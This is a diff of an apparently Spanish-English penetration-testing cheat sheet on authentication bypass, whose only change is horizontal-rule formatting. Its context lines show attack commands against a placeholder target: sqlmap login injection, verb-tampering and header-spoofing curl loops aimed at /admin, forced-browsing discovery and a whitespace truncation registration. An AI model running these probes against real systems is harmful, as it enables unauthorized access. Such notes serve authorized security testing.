@@ -17,7 +17,7 @@ linked:
 ---
 # Auth Bypass - Bypass de Autenticación
 
-***
+---
 
 ## Default Credentials
 
@@ -34,7 +34,7 @@ linked:
 | Browser → vendor docs página default credentials → lookup product específico | OSINT vendor defaults | Specific app. |
 ^auth-bypass-defaults
 
-___
+---
 
 ## SQL Injection en Login
 
@@ -52,7 +52,7 @@ ___
 | `sqlmap -r login.req --forms --batch --level 5 --risk 3` | Saved request + max coverage | Comprehensive. |
 ^auth-bypass-sqli
 
-___
+---
 
 ## HTTP Verb Tampering
 
@@ -71,7 +71,7 @@ ___
 | `for m in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE FOO; do echo "=== $m ==="; curl -s -X $m https://target/admin -o /dev/null -w "%{http_code}\n"; done` | Bulk method probe | Discovery. |
 ^auth-bypass-verb
 
-___
+---
 
 ## Header Spoofing
 
@@ -92,7 +92,7 @@ ___
 | `for h in 'X-Forwarded-For' 'X-Real-IP' 'True-Client-IP' 'X-Forwarded-Host' 'X-Original-URL' 'X-Custom-IP-Authorization'; do curl -sI -H "$h: 127.0.0.1" https://target/admin \| head -1; done` | Bulk header bypass probe | Discovery. |
 ^auth-bypass-headers
 
-___
+---
 
 ## Forced Browsing (Direct Access)
 
@@ -112,7 +112,7 @@ ___
 | `katana -u https://target -jc \| grep -iE 'admin\|api'` | JS-extracted paths | Frontend route discovery. |
 ^auth-bypass-forced
 
-___
+---
 
 ## Truncation Attack
 
@@ -126,4 +126,4 @@ ___
 | `curl --data-urlencode "user=admin                                        " -d "password=x" https://target/register` (espacios solo) | Trailing whitespace ignore | Mass register approach. |
 ^auth-bypass-truncation
 
-***
+---
